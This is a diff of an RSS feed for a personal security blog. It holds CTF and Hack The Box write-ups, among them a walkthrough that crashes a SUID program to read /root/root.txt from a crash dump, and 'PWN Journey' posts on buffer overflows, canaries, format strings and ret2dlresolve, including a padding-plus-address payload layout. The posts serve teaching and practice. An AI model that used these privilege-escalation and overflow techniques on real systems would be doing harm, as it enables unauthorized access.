+        FILE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;fp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fopen(path, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;);
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fp &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; NULL) {
+            fputs(summary, fp);
+            fclose(fp);
+        } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+            printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Could not open %s for writing&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, path);
+        }
+    }
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;code-breakdown&#34;&gt;Code breakdown&lt;/h4&gt;
+&lt;p&gt;The source consists of three functions:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;dircount&lt;/code&gt; counts the number of total directories within a given path. The function, however, is not exploitable as of its proper implementation.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;filecount&lt;/code&gt; procedure reads and counts every single characters of a given file.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;main&lt;/code&gt; reads input from STDIN and calls &lt;code&gt;dircount&lt;/code&gt; whether the path is a directory; otherwise, invokes &lt;code&gt;filecount&lt;/code&gt;. The function then prompts us to save the result as a file and exits.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Even though the write feature sounds promising, the program&amp;rsquo;s SUID is removed before we can do anything. Luckily, the author did give us a hint with the line &lt;code&gt;prctl(PR_SET_DUMPABLE, 1)&lt;/code&gt; as the &lt;code&gt;PR_SET_DRUMPABLE&lt;/code&gt; attribute normally takes &lt;code&gt;1&lt;/code&gt; by default; however, it is reset to the current value in &lt;code&gt;/proc/sys/fs/suid_dumpable&lt;/code&gt; whenever there is a change in the process&amp;rsquo;s ownership or, particularly in this practice, its UID/GID. There are also other details and yet, we have the function fully covered &lt;a href=&#34;https://man7.org/linux/man-pages/man2/prctl.2.html&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;h4 id=&#34;solution&#34;&gt;Solution&lt;/h4&gt;
+&lt;p&gt;Based on what we have discussed above, &lt;code&gt;filecount&lt;/code&gt; has prior access to &lt;code&gt;/root/&lt;/code&gt; and is able to read the content therein before &lt;code&gt;setuid&lt;/code&gt; revokes our permission. Thus, the program technically has to be &lt;em&gt;stopped&lt;/em&gt; or crashed, thereby dumping the &lt;code&gt;/root/root.txt&lt;/code&gt; context to, in this case, &lt;code&gt;/var/crashes&lt;/code&gt; and we can extract the dump using &lt;code&gt;apport-unpack&lt;/code&gt;. I get the idea from &lt;a href=&#34;https://askubuntu.com/a/186285&#34;&gt;this answer&lt;/a&gt; on AskUbuntu after literally hours of finding escalation methods with &lt;code&gt;prctl&lt;/code&gt; which are only CVEs and unintended solutions although I do gain root access using them.&lt;/p&gt;
 </content>
     </item>
     
@@ -70,6 +1044,16 @@ And about the author, my name is Huy and I am a big fan of reversing (malicious)
 &lt;p&gt;And about the author, my name is Huy and I am a big fan of reversing (malicious) applications, kernel utilities, or hacking in general. Also, I love spending leisure time playing CTF, solving HTB machines, watching movies and writing.&lt;/p&gt;
 &lt;p&gt;Hopefully, you can find what you need here.&lt;/p&gt;
 </content>
+    </item>
+    
+    <item>
+      <title>PWN Journey 3: More format string and ret2dlresolve</title>
+      <link>https://legiahuyy.github.io/blog/en/posts/pwns-3/</link>
+      <pubDate>Mon, 10 Jan 2022 09:30:00 +1345</pubDate>
+      
+      <guid>https://legiahuyy.github.io/blog/en/posts/pwns-3/</guid>
+      <description>&lt;p&gt;This post will demonstrate how we can abuse more of the format string vulnerability in different ways, or by a set of special format specifiers, precisely. Likewise, we will contemplate a new technique called &lt;strong&gt;ret2dlresolve&lt;/strong&gt; and have some exercise regarding.&lt;/p&gt;</description>
+      <content>&lt;p&gt;This post will demonstrate how we can abuse more of the format string vulnerability in different ways, or by a set of special format specifiers, precisely. Likewise, we will contemplate a new technique called &lt;strong&gt;ret2dlresolve&lt;/strong&gt; and have some exercise regarding.&lt;/p&gt;</content>
     </item>
     
     <item>
@@ -516,7 +1500,7 @@ relro    partial
 &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-31_10-11.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;and &lt;code&gt;win&lt;/code&gt;:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-31_10-16.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;You might be wondering why there is no canary check in either the prologue or epilogue of these two &lt;code&gt;main&lt;/code&gt; and &lt;code&gt;win&lt;/code&gt; functions. This happens since the two simply do not inquire about the stack or have any particularly tasks that need the sentinel values.&lt;/p&gt;
+&lt;p&gt;You might be wondering why there is no canary check in either the prologue or epilogue of these two &lt;code&gt;main&lt;/code&gt; and &lt;code&gt;win&lt;/code&gt; functions. This happens since the two simply do not inquire about the stack or have any particular tasks that need the sentinel values.&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;login&lt;/code&gt;, however, is different as it is plain to see the canary is being stored at &lt;code&gt;rbp-0x8&lt;/code&gt;:&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[0x7f492b935050]&amp;gt; pdf @ sym.login
             ; CALL XREF from main @ 0x56279e188182
@@ -797,11 +1781,11 @@ print(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;clean())
 &lt;p&gt;Let me introduce you to the &lt;strong&gt;De Bruijn Sequence&lt;/strong&gt;, which contains no string of &lt;code&gt;n&lt;/code&gt; character repeated. The sequence can either be created by yourself or any available auxiliaries (e.g., &lt;code&gt;ragg2&lt;/code&gt;, &lt;code&gt;cyclic&lt;/code&gt;, &lt;code&gt;pattern_create (gdb)&lt;/code&gt;).&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_11-11.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;The reason why a &lt;em&gt;random&lt;/em&gt; gibberish string is able to help us to find the padding is that while you are filling the stack with the sequence, &lt;code&gt;RIP&lt;/code&gt; (and even others) could already be overwritten, thereby leading to a SIGSEGV and crashing the execution. With that, the particular position of these so-called &lt;em&gt;random bytes&lt;/em&gt; in &lt;code&gt;RIP&lt;/code&gt; now is that of our padding length in the sequence pattern.&lt;/p&gt;
-&lt;p&gt;Next, we want to load the binary in our debugger and find the padding length.&lt;/p&gt;
+&lt;p&gt;Next, we want to load the binary in our debugger and find the padding length&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_11-40.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;and our registers table:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_11-50.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;The &lt;code&gt;wopO `dr rip` &lt;/code&gt; command simply finds the given value in &lt;code&gt;RIP&lt;/code&gt; into a De Bruijn sequence at a current offset or you can just type &lt;code&gt;wopO 0x41415441&lt;/code&gt; instead and it shows us our padding size, 56.&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;wopO `dr rip` &lt;/code&gt; command simply finds the given value in &lt;code&gt;RIP&lt;/code&gt; into a De Bruijn sequence at a current offset or you can just type &lt;code&gt;wopO 0x41415441&lt;/code&gt; instead and it will show us our same padding size, 56.&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;payload = PADDING (56 bytes) + FLAG_ADDR (RIP)
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We have one last factor, the address of &lt;code&gt;flag()&lt;/code&gt; which is &lt;code&gt;0x0040116b&lt;/code&gt;. To get it, simply type &lt;code&gt;afl&lt;/code&gt; for a list of functions and their addresses.&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[0x41415441]&amp;gt; afl
